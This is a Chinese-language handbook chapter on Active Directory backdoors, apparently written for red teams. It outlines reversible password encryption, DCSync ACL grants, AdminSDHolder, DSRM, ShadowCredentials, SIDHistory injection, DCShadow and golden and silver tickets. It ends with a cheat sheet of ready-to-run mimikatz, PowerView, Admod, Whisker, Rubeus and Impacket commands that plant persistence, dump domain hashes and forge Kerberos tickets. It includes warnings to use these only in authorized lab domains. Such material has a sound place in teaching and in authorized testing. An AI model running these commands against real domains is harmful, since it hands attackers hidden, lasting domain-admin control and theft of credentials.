# 第14章 域后门分析

## 可逆密码

- 域默认策略或细粒度密码策略可开启可逆加密。
- 用户属性 `AllowReversiblePasswordEncryption` 也可单独开启。
- 只对授权账号操作，并记录策略变更。

## DCSync / ACL / AdminSDHolder

- 给普通用户添加 DCSync 权限可作为隐蔽后门。
- ACL 后门需检查 `Domain Admins`、GPO、关键用户和机器的 ACE。
- AdminSDHolder 权限会周期性同步到受保护对象。

## dsrm / ShadowCredentials / SIDHistory

- dsrm 密码 + `DsrmAdminLogonBehavior` 可形成本地管理员后门。
- ShadowCredentials 通过 `msDS-KeyCredentialLink` 添加证书。
- SIDHistory 注入存在域控崩溃风险，必须谨慎。

## DCShadow

- 模拟域控复制修改对象属性，需要域管和机器权限。
- 测试时必须确保能回滚并监控 AD 复制健康状态。

## 黄金/白银票据

- 黄金票据：伪造 TGT，依赖 krbtgt Hash。
- 白银票据：伪造服务票据，依赖服务账号 Hash。
- 票据利用需注意时间同步、服务名、SPN 和 PAC 校验。
## 命令速查

### 可逆密码

```powershell
Set-ADAccountControl -Identity <USER> -AllowReversiblePasswordEncryption $True
Set-ADDefaultDomainPasswordPolicy -Identity <DOMAIN> -ReversibleEncryptionEnabled $true
Get-ADDefaultDomainPasswordPolicy -Identity <DOMAIN>
```

```cmd
mimikatz.exe "log" "lsadump::dcsync /domain:<DOMAIN> /user:<USER> /dc:<DC_FQDN>" "exit"
```

### DCSync / ACL / AdminSDHolder

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=<DOMAIN>,DC=<TLD>" -PrincipalIdentity <USER> -Rights DCSync -Verbose
(Get-Acl "ad:\dc=<DOMAIN>,dc=<TLD>").Access | ? {($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "89e95b76-444d-4c62-991a-0facbeda640c")} | Select IdentityReference
Admod.exe -b "CN=AdminSDHolder,CN=System,DC=<DOMAIN>,DC=<TLD>" "SD##ntsecuritydescriptor::(GETSD){+D=(A;;GA;;;<DOMAIN>\\<USER>)}"
```

### dsrm / ShadowCredentials / SIDHistory

```cmd
ntdsutil "set dsrm password" "reset password on server null" q q
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
```

```cmd
Whisker.exe add /target:<USER> /domain:<DOMAIN> /dc:<DC_FQDN>
Rubeus.exe asktgt /user:<USER> /certificate:<CERT_BASE64> /password:"<CERT_PASSWORD>" /domain:<DOMAIN> /dc:<DC_FQDN> /getcredentials /show /nowrap
```

```cmd
privilege::debug
sid::patch
sid::add /sam:<USER> /new:<TARGET_USER>
sid::query /sam:<USER>
```

### 黄金/白银票据

```cmd
Rubeus.exe golden /domain:<DOMAIN> /user:<FAKE_USER> /id:500 /sid:<DOMAIN_SID> /aes256:<KRBTGT_AES> /ptt /nowrap
Rubeus.exe asktgs /service:LDAP/<DC_FQDN>,cifs/<DC_FQDN>,HOST/<DC_FQDN> /ptt /dc:<DC_FQDN> /nowrap /ticket:<TICKET>
```

```bash
ticketer.py -nthash <SERVICE_NTHASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn cifs/<TARGET_FQDN> <FAKE_USER>
set KRB5CCNAME=<FAKE_USER>.ccache
wmiexec.py -k -no-pass <DOMAIN>/<FAKE_USER>@<TARGET_FQDN>
```

提示：SIDHistory、DCShadow、票据伪造存在域控/业务稳定性风险；仅在授权实验域使用，并准备快照和回滚。
